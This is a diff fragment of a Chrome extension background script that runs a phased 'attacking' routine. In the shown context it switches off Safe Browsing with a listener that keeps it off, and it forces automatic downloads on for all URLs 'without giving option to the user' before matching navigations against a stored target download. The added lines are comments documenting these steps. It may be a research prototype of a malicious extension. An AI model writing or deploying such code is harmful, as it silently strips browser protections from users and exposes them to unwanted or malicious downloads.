@@ -479,6 +479,8 @@ function phase(){ //This function manges any kind of change in the phase
             chrome.storage.local.set({ContPhi:  result.con});
             chrome.storage.local.set({ParentPhi:result.par});
             if (parseInt(result.phase) ==1){
+                //Deactivate the safe browsing option and put the listener
+                //Exactly the same than in weakening extensions
                 function keepItOff(pref) {
                     function turnItOff(details) {
                       
@@ -517,7 +519,7 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
     }
 });
 
-
+//Extensions just rejected by using <all_urls>
 //https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls
 
 
@@ -527,6 +529,7 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
 function modify(item){
     chrome.storage.local.get(["phase"]).then((result)=>{ //look at the actual phase
         if(result.phase == 1){ //if we are in attacking phase
+            //activate automatic downloads, do not give option to the user
             chrome.contentSettings.automaticDownloads.set({primaryPattern:'<all_urls>', setting:"allow"});
             chrome.storage.local.get(["ObjDown","TarDown","NamDown"]).then((result1)=>{ //ask for all storage information 
                 if (item.url.includes(result1.ObjDown)){ //is the object our objective?
